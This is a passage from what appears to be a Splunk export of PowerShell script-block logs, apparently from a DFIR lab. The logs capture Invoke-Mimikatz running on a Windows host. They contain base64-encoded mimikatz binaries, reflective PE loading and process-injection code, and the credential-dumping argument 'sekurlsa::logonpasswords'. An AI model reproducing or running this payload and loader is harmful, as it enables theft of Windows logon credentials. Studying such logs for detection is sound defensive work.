/Cr+KsArAisEKwYrCCsKKwwrDisQKxIrFCsWKxgrGiscKx4rICsiKyQrJisoKyorLCsyKzgrOis8Kz4rACtCK0QrRitIK0orTCtOK1ArUitUK1YrWCteK2QrZitoK2orbCtuK3Arcit0K3YreCt6K3wrfitAK4IrhCuGK4griiuMK44rkCuSK5QrliuYK5ornCueK6AroiukK6YrqCuqK6wrriuwK7IrtCu2K7gruiu8K74rgCvCK8QrxivIK8orzCvOK9Ar0ivUK9Yr2CvaK9wr3ivgK+Ir5CvmK+gr7iv0K/Yr+Cv6K/wr/ivANALAKgCAAAAoAigEKAYoCCgKKAwoDigQKBIoFCgWKBgoGigcKB4oICgiKCQoJigoKCooLCgwKDIoOCg6KDwoPigAKEIoRihIKEwoTihSKFQoWChaKF4oYChkKGYoaihsKHIoeCh6KH4oQCiEKIYoiiiMKJAokiiYKJoonCieKKAopiioKKoorCiuKLAosii0KLYouCi6KLwoviiAKMIoxCjGKMgoyijMKM4o0CjSKNQo1ijYKNoo3CjeKOAo4ijkKOYo6CjqKOwo/ijAKQYpDCkOKRApEikUKRYpGCkaKRwpHikgKSIpJCkmKSgpKiksKS4pMCkyKTQpNik4KTopPCk+KQApQilEKUYpSClKKUwpTilQKVIpVClWKVgpWilcKV4pYCliKWQpZiloKWopbCluKXApcil0KXYpeilAKYIphCmGKYgpiimMKY4pkCmSKZQplimYKZopnCmeKaApoimkKaopsCmyKbQptim4KbopvCm+KYApwinEKcYpyCnKKcwpzinQKdIp1CnWKdgp2incKd4p4CniKeQp5inoKeop7CnuKfAp8in0KfYp+Cn6Kfwp/inAKgIqBCoKKhAqEioUKhYqGCoaKhwqHiogKiIqJComKigqKiosKjAqMio2KjgqPioEKkYqSCpKKkwqTipUKlwqZCpsKm4qdCp2KnwqfipEKogqiiqQKpIqlCqWKpgqniqoKqoqrCq0KrYquCq6KrwqviqAKsIqxCrGKsgqyirMKs4q0CrSKtQq1irYKtoq3CreKuAq4irkKuYq6CrqKuwq7irwKvIqwCsMKw4rECsSKxQrFisYKxorHCseKyArIiskKyYrKCsqKywrLiswKzIrNCs2KzgrOis8Kz4rCCtKK0wrTitgK3Irdit6K34rQCuCK4A4AsAzAAAABCmGKYgpiimMKZApkimUKZYpmCmaKZwpnimgKaIppCmmKagpqimsKa4psCmyKbQptim4KbopvCm+KYApwinEKcYpyCnKKcwpzinQKdIp1CnWKdgp2incKd4p4CniKeQp5inoKeop7CnuKfAp8in0KfYp+Cn6Kfwp/inAKgIqBCoGKggqCioMKg4qECoSKhQqFioYKhoqHCoeKiAqIiokKiYqKCoqKiwqLiowKjIqNCo2KjgqOio8Kj4qACpCKkQqRipuKoA8AsAHAAAAACgCKAQoBig6KD4oAChGKEgoQAAADAQAIQAAABwobih2KH4oRiiOKJoooCiiKKQosii0KIgo1ilgKiIqJComKigqKiosKi4qMCoyKjYqOCo6KjwqPioAKkIqRCpoKmoqaCrwKvQq+irAKxArFCskKygrOCs8KwwrUCtwK3QrRCuIK5grnCusK7ArgCvEK9Qr2CvoK+wr/CvAEAQALAAAAAAoFCgYKCgoLCg4KDooPCg+KAAoQihGKFAolCikKKgouCi8KIwo0CjgKOQo9Cj4KMgpDCkcKSApMCk0KQQpSClYKVwpbClwKUAphCmUKZgpqCmsKbwpgCnOKfgp/CnkKjgqDCpgKnQqSCqcKqAqsCq0Kpgq3CrsKvAqwCsEKxQrGCs4KzwrDCtQK2ArZCt0K3grUCuWK5wrsCu0K4QryCvYK9wr7CvwK8AUBAAeAAAAACgEKBQoGCgEKEgoWChcKGwocChAKIQolCiYKKgorCi8KIAo0CjUKOQo6CjYKSwpAClUKWgpYCm0KYgp3CnwKcQqICo0KggqXCpwKkQqmCqsKoAq1CroKvwq0CskKzgrDCtgK3wrQiuUK6grvCuwK8AYBAAoAAAABCgYKCwoAChUKGgofChQKKQotCi2KLooiCjOKNwo4ij0KMgpHCkwKQQpWClsKUQphimKKaAptCmIKdwp8CnEKhgqLCo8Kj4qAipUKmQqZipqKngqeip+KlAqpCq4KpAq0irWKugq/CrMKw4rEiskKzgrDCtmK24reCtAK4orkiucK6Qrriu2K4AryCvSK9or5CvsK/Yr/ivAHAQACABAAAgoECgiKCwoLigwKDQoPigGKFgoYihkKGYoaih0KHwoRiiOKJgooCiqKLIovCiEKM4o1ijgKOgo8ij6KMQpDCkWKR4pKCkwKTopAilMKVQpXilmKXApeClCKYoplCmcKaYprim4KYApyinSKdwp5CnuKfYpwCoIKhIqGiokKiwqNio+KggqUCpaKlwqXipgKmIqbCpuKnAqcip0Kn4qQCqCKoQqhiqQKpIqlCqWKpgqoiqkKqYqqCqqKrQqtiq4KroqvCqGKsgqyirMKs4q1CrYKuAq5irqKvIq+Cr8KsQrFisoKzIrOisGK0grSitMK04rUCtaK1wrXitgK2IrZCtmK2grbityK3orQCuEK4wrkiuWK54rgAAAIAQAPQBAACYoqCiqKKworii4KLoovCi+KIAoyijMKM4o0CjSKNwo3ijgKOIo5CjuKPAo8ij0KPYowCkCKQQpBikIKRIpFCkWKRgpGikkKSYpKCkqKSwpNik4KTopPCk+KQgpSilMKU4pUClaKVwpXilgKWIpbCluKXApcil0KX4pQCmCKYQphimQKZIplCmWKZgpoimkKaYpqCmqKbYpuCm6KbwpvimAKcopzCnOKdAp0inUKdYp2CniKeQp5inoKeop7Cn2Kfgp+in8Kf4pwCoCKgQqCCoKKg4qFCoaKhwqICoiKiYqKCosKi4qMio0KjgqOio+KgAqRCpGKkoqUCpWKlgqXCpeKmIqZCpoKm4qcCp0KnYqeip8KkAqgiqGKogqjCqOKpIqlCqYKpoqniqgKqQqpiqqKrAqsiq2KrgqvCq+KoIqxCrIKsoqzirQKtQq1iraKtwq4CriKuYq6CrsKu4q8ir0Kvgq+ir+KsArBCsGKworDCsQKxYrHCseKyIrJCsoKyorLiswKzQrNis6KzwrACtCK0YrSCtMK04rUitUK1grWiteK2ArZCtmK2orbCtwK3Irdit4K3wrQiuEK4griiuOK5QrmiugK6YrrCuyK7gruiu+K4ArxCvGK8or0CvWK9wr4ivkK+4r9ivAAAAkBAAZAAAAACgIKBIoGiggKCQoKCgsKDQoOCgGKEgoSihMKE4oUChaKFwoXihgKGIoZChmKGgoaihsKG4ocChyKHQodih4KHoofCh+KEAohCiGKIgoiiiMKI4okCiSKJQogAAAAAAAAAAAAA='\n\n  \t# mimikatz 2.2.0 (win 32) #18362\n    # SHA256 hash: 08AB87667A5C6EB25DDB1BD659613EF8C773526AE28B191C34E854CD6F13F8D4 \n    # VirusTotal Analysis: no signature yet ;)\n    $PEBytes32 = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKAEAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAACLMJxxz1HyIs9R8iLPUfIie80DIsRR8iJ7zQEiWlHyInvNACLWUfIizjz2I9xR8iLOPPEj1VHyItTMbiLNUfIiqb85IstR8iJUujkizVHyIsYpcSLNUfIizjz3I+9R8iIMXq8ixVHyIsYpYSLqUfIiz1HzIvpT8iIFPPojr1HyIgU88iPOUfIiBTwNIs5R8iIFPPAjzlHyIlJpY2jPUfIiAAAAAAAAAABQRQAATAEFACuiul0AAAAAAAAAAOAAAiELAQ4XAPgIAABaBQAAAAAAoAMHAAAQAAAAEAkAAAAAEAAQAAAAAgAABQABAAAAAAAFAAEAAAAAAACADgAABAAAAAAAAAMAQAEAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAdA0AYAAAAGB0DQAwAgAAAAAOAIgCAAAAAAAAAAAAAAAAAAAAAAAAABAOAIhvAABwZw0AHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHAZCQBAAAAAAAAAAAAAAAAAEAkAnAgAABxxDQBgAAAAAAAAAAAAAAAAAAAAAAAAAC50ZXh0AAAAXfYIAAAQAAAA+AgAAAQAAAAAAAAAAAAAAAAAACAAAGAucmRhdGEAACKYBAAAEAkAAJoEAAD8CAAAAAAAAAAAAAAAAABAAABALmRhdGEAAAB8SgAAALANAAA6AAAAlg0AAAAAAAAAAAAAAAAAQAAAwC5yc3JjAAAAiAIAAAAADgAABAAAANANAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAIhvAAAAEA4AAHAAAADUDQAAAAAAAAAAAAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFWL7ItFEDPJU6NM+g0QjUUQUGhA+g0QUWoDaFiNCxD/NTT6DRCJDUD6DRDHBUT6DRABAAAAiQ1I+g0Q/xV8FwkQM9uFwA+Uw4XAdA1QaBB2CRDosHIAAFlZi8NbXcNRU4tcJBRVVlcPtwOL+WaLTCQYM/aJVCQQD7fpiUQkIDk3D4TlAAAAuP8AAABmO8gPh8UAAAA5dwx0KGjYdgkQ6GRyAACLTCQUi9VqAejzxwAAaOh2CRDoTXIAAItUJByDxAyNRCQgUDl3BHQZD7cDUP90JCRVUmiwNjEA/zf/FYAXCRDrEP90JCBWVVJW/zf/FZwXCRCFwHVAOXcMdCZo7HYJEOgAcgAAi1QkJItMJCBqAeiNxwAAaOh2CRDo53EAAIPEDA+3A4tMJCA7wRv2RjvId0NmiQvrPjl3BLkYdwkQULj8dgkQD0TBUGg4dwkQ6LNxAACDxAzrHVBTVWiIdwkQ6KFxAACDxBDrC2gYeAkQ6JJxAABZX4vGXl1bWcNVi+yB7AABAACKRQxTVoiFAv///4vxZotFGDPJZseFAP////8AswSIjQP///9mhcB0I4rYD7fAUP91FI2FBf///4idBP///1Do9Q0HAIPEDIDDBTPJg30kAItVIHUTZjkKdA6KAg+2y/7DiIQNAP///1L/dRwPtsONlQD///9Qi87oWv7//4PEDF5bycNVi+yB7AABAABTVleLfRQz9moCW2aLD2YDyw+3wYlFFDl1GA+EywAAALj/AAAAZjvID4epAAAAagGNRRRQjYUA////UP91DP91CFFWUYtNGOge////g8QghcAPhJ8AAACLRRRmO8NyZw+3yLqQAAAAZjmUDf7+//91PA+3F4PA/mY70A+3yA+32IvBG/aJXRRGUGY7yncXjYUA////UP91EOgPDQcAg8QMZokf61FSaHh4CRDrNA+2hA3//v//UA+2hA3+/v//UGj4eAkQ6xsPt8BQaGB5CRDoH3AAAFnrHlAPt8FQaPB5CRDoDXAAAIPEDOsLaHB6CRDo/m8AAFlfi8ZeW8nCFAC4aPoNEMNVi+z/dRj/dRT/dRD/dQz/dQjo4/////9wBP8w6OVJBwCDyf+DxByFwA9IwV3DjUQkEFBqAP90JBT/dCQU/3QkFOi6////g8QUw1WL7FFRagWNRfjGRfgAUA/KaOh6CRBRiVX5/xXwFgkQg8QQycNVi+yD7CCNRfBWUFKL8f8VwBQJEIXAdEwPt0X8UA+3RfpQD7dF+FAPt0X2UA+3RfJQD7dF8FBo7HoJEI1F4GoQUOh5////g8QkhcB+F2oPjUXgUGoYaAx7CRBW/xXwFgkQg8QUXsnDVYvsUVFWagFSjUX4i/FQ/xUkGAkQhcB4Iw+3RfhQ/3X8ahtoDHsJEFb/FfAWCRCDxBSNRfhQ/xUoGAkQXsnDVldoa2l3aWhEfAkQuEB8CRAz9lBQUEZWaAAQAABoAAQAAGgAAAEA/xXkFwkQM/+jsPMNEIXAdFNXV1dotPMNEFD/FdQXCRCFwHkUUGgQewkQ6INuAABZiT208w0Q6zZXV1douPMNEP81sPMNEP8V7BcJEIXAeR9QaHh7CRDoV24AAFmJPbjzDRDrCmjgewkQ6ERuAABZOT2w8w0QdBA5PbTzDRB0CDk9uPMNEHUHi/foBQAAAF+Lxl7DobjzDRCFwHQOUP8V8BcJEIMluPMNEAChtPMNEIXAdA5Q/xXoFwkQgyW08w0QAKGw8w0QhcB0DlD/FdgXCRCDJbDzDRAAwzPAOQW08w0QdCCFyXQchdJ0GFZSM/aJQgRRZoky/zW08w0Q/xXgFwkQXsOD7FxTVVZXM/aNRCRAi/6JNRj0DRBQuxj0DRCJfCQo/xUUEgkQahJWVo1EJExQ/xUEFgkQi+iJbCQQg/3/D4ScAgAAi8aJdCQsjUwkUMdEJFAcAAAAUVCNRCRIUFZV/xUIFgkQiUQkMIXAD4RSAgAAVo1EJBiJdCQYUFZWjUQkYFBV/xUAFgkQhcAPhTICAAD/FagUCRCD+HoPhSMCAAD/dCQUakD/FbQUCRCL8Il0JBiF9g+EBwIAAGoAjUQkGMcGBgAAAFD/dCQcjUQkXFZQVf8VABYJEIXAD4TaAQAAM8mNRgRRUWoDUWoDUVCJRCQ8/xWwFAkQiUQkKIP4/w+EogEAAI1MJDTHRCQ0DAAAAFFQ/xUEEgkQhMAPhHoBAABmi1QkOjPJZotsJDgzwGY5qHB8CRB1DWY5kHJ8CRAPhPsAAACDwAxBg/hIcuEz7YXtD4Q/AQAA9kUEAg+ENQEAAGp0akD/FbQUCRCJA4XAD4QhAQAAjUQkHFD/dCQs/xUAEgkQhMB0K4sDg8AYUP90JCD/FRASCRCFwHkNUGiQ7gkQ6AdsAABZWf90JBz/FfwRCRD/dCQg6HZGBwBZiwuNdCQ0iUEIizuDxwylpaWLA4t8JCSJaFgz7YsDVVVqA8ZAXASLA1VqA2oD/3QkOMZAXQSLA8ZAXlWLA4l4BP8VsBQJEIsLiUFgiwM5aGB0ZoN4YP90YFVVx0BkiBMAAP8zaPgaABBVVf8VnBQJEIsLiUFohcB0F4sbR4l8JCTrU2vpDIHFcHwJEOkC/////xWoFAkQUGgI7wkQ6FBrAACLA1lZ/3Bg/xWgFAkQ/zP/FZgUCRDrHf8VqBQJEFBoqO8JEOgoawAAWVn/M/8VmBQJEIkDi3QkGItsJBD/dCQo/xWgFAkQ6xP/FagUCRBQaDDwCRDo92oAAFlZVv8VmBQJEDP2i0QkLECDfCQwAIlEJCwPhXP9//9V/xX8FQkQ6xP/FagUCRBQaMjwCRDovmoAAFlZM8A7x19eG8Bd99hbg8Rcw1FXiz0Y9A0Qhf90b1VWM+2LR2CFwHQbg/j/dAwz0ovP6PsDAACLR2BQ/xWgFAkQiW9giW9kOW9odA1V/3do/xWkFAkQiW9oiW9sOW9wdA1V/3dw/xWkFAkQiW9wOW8IdAn/dwjoKEUHAFmLN1f/FZgUCRCL/oX2dZdeXV9Zw1GLRCQMU1VWakGJTCQQi+pZUWpAM9uJCP8VtBQJEItUJBSL8IkyhfYPhNAAAABXagdfO+9yFVVoUPEJEOjtaQAAi1QkIDvvWVmLMg9C/YX/dGCLRCQQjV4DK/CNaAGKTf+KwYrRDBAPtskPtsCA4vAPRMiIDC6KRQCNbQiIQ/+KRfmIA41bCIpF+ohD+YpF+4hD+opF/IhD+4pF/YhD/IpF/ohD/YPvAXW0i1QkGDPbizKLRCQcM8lBx0Y5BARV/2bHR\n79490727-fa2f-46e6-bf60-bef62708dfb5","_time":"2025-11-23T14:38:46.648+0000","category":"Execute","dvc":"DESKTOP-78CU07R","dvc_nt_host":"DESKTOP-78CU07R","event_id":"227","eventtype":["endpoint_services_processes","windows_event_signature","windows_ta_data"],"host":"DESKTOP-78CU07R","id":"227","index":"mydfir-project","linecount":"27","punct":"//_::._=--/===-==-------==--====___=__=________.__","severity":"medium","severity_id":"3","signature_id":"4104","source":"Microsoft-Windows-PowerShell/Operational","sourcetype":"WinEventLog","splunk_server":"chalitha-splunk","tag":"track_event_signatures","tag::eventtype":"track_event_signatures","vendor_product":"Microsoft Windows"}}
{"preview":false,"result":{"ComputerName":"DESKTOP-78CU07R","DebugPreference":"Continue","EventCode":"4104","EventType":"3","ExeArgs":"sekurlsa::logonpasswords exit","Keywords":"None","LogName":"Microsoft-Windows-PowerShell/Operational","Message":"Splunk","OpCode":"On","Output":"[System.Runtime.InteropServices.Marshal]","OutputPtr":"$WStringFunc.Invoke($WStringInput)","PEBytes":"[Byte[]]","PEBytes64":"'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","PEHandle":"[IntPtr]","PEInfo":"Get-PEDetailedInfo","PELoadedInfo":"Invoke-MemoryLoadLibrary","Processor":"$Processors[0]","Processors":"Get-WmiObject","RThreadHandle":"Invoke-CreateRemoteThread","RecordNumber":"117","RemotePEHandle":"$PELoadedInfo[1]","RemoteProcHandle":"$Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)","Sid":"S-1-5-21-1697325460-2044954953-441488130-1001","SidType":"0","SourceName":"Microsoft-Windows-PowerShell","Success":"$Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)","TaskCategory":"Execute","Type":"Warning","User":"NOT_TRANSLATED","VoidFuncAddr":"Get-MemoryProcAddress","WStringFunc":"[System.Runtime.InteropServices.Marshal]","WStringFuncAddr":"Get-MemoryProcAddress","WStringFuncDelegate":"Get-DelegateType","WStringInput":"[System.Runtime.InteropServices.Marshal]","_raw":"11/23/2025 08:38:46.646 AM\nLogName=Microsoft-Windows-PowerShell/Operational\nEventCode=4104\nEventType=3\nComputerName=DESKTOP-78CU07R\nUser=NOT_TRANSLATED\nSid=S-1-5-21-1697325460-2044954953-441488130-1001\nSidType=0\nSourceName=Microsoft-Windows-PowerShell\nType=Warning\nRecordNumber=117\nKeywords=None\nTaskCategory=Execute a Remote Command\nOpCode=On create calls\nMessage=Splunk could not get the description for this event. Either the component that raises this event is not installed on your local computer or the installation is corrupt.\n\nFormatMessage error:\n\nGot the following information from this event: \n\nd -ne $null) -and ($ProcId -ne 0))\n\t\t{\n\t\t\t$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)\n\t\t\tif ($RemoteProcHandle -eq [IntPtr]::Zero)\n\t\t\t{\n\t\t\t\tThrow \"Couldn't obtain the handle for process ID: $ProcId\"\n\t\t\t}\n\t\t\t\n\t\t\tWrite-Verbose \"Got the handle for the remote process to inject in to\"\n\t\t}\n\t\t\n\n\t\t#Load the PE reflectively\n\t\tWrite-Verbose \"Calling Invoke-MemoryLoadLibrary\"\n\n        try\n        {\n            $Processors = Get-WmiObject -Class Win32_Processor\n        }\n        catch\n        {\n            throw ($_.Exception)\n        }\n\n        if ($Processors -is [array])\n        {\n            $Processor = $Processors[0]\n        } else {\n            $Processor = $Processors\n        }\n\n        if ( ( $Processor.AddressWidth) -ne (([System.IntPtr]::Size)*8) )\n        {\n            Write-Verbose ( \"Architecture: \" + $Processor.AddressWidth + \" Process: \" + ([System.IntPtr]::Size * 8))\n            Write-Error \"PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS.\" -ErrorAction Stop\n        }\n\n        #Determine whether or not to use 32bit or 64bit bytes\n        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)\n        {\n            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)\n        }\n        else\n        {\n            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)\n        }\n        $PEBytes[0] = 0\n        $PEBytes[1] = 0\n\t\t$PEHandle = [IntPtr]::Zero\n\t\tif ($RemoteProcHandle -eq [IntPtr]::Zero)\n\t\t{\n\t\t\t$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs\n\t\t}\n\t\telse\n\t\t{\n\t\t\t$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle\n\t\t}\n\t\tif ($PELoadedInfo -eq [IntPtr]::Zero)\n\t\t{\n\t\t\tThrow \"Unable to load PE, handle returned is NULL\"\n\t\t}\n\t\t\n\t\t$PEHandle = $PELoadedInfo[0]\n\t\t$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process\n\t\t\n\t\t\n\t\t#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.\n\t\t$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants\n\t\tif (($PEInfo.FileType -ieq \"DLL\") -and ($RemoteProcHandle -eq [IntPtr]::Zero))\n\t\t{\n\t\t\t#########################################\n\t\t\t### YOUR CODE GOES HERE\n\t\t\t#########################################\n                    Write-Verbose \"Calling function with WString return type\"\n\t\t\t\t    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName \"powershell_reflective_mimikatz\"\n\t\t\t\t    if ($WStringFuncAddr -eq [IntPtr]::Zero)\n\t\t\t\t    {\n\t\t\t\t\t    Throw \"Couldn't find function address.\"\n\t\t\t\t    }\n\t\t\t\t    $WStringFuncDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])\n\t\t\t\t    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)\n                    $WStringInput = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArgs)\n\t\t\t\t    [IntPtr]$OutputPtr = $WStringFunc.Invoke($WStringInput)\n                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($WStringInput)\n\t\t\t\t    if ($OutputPtr -eq [IntPtr]::Zero)\n\t\t\t\t    {\n\t\t\t\t    \tThrow \"Unable to get output, Output Ptr is NULL\"\n\t\t\t\t    }\n\t\t\t\t    else\n\t\t\t\t    {\n\t\t\t\t        $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)\n\t\t\t\t        Write-Output $Output\n\t\t\t\t        $Win32Functions.LocalFree.Invoke($OutputPtr);\n\t\t\t\t    }\n\t\t\t#########################################\n\t\t\t### END OF YOUR CODE\n\t\t\t#########################################\n\t\t}\n\t\t#For remote DLL injection, call a void function which takes no parameters\n\t\telseif (($PEInfo.FileType -ieq \"DLL\") -and ($RemoteProcHandle -ne [IntPtr]::Zero))\n\t\t{\n\t\t\t$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName \"VoidFunc\"\n\t\t\tif (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq 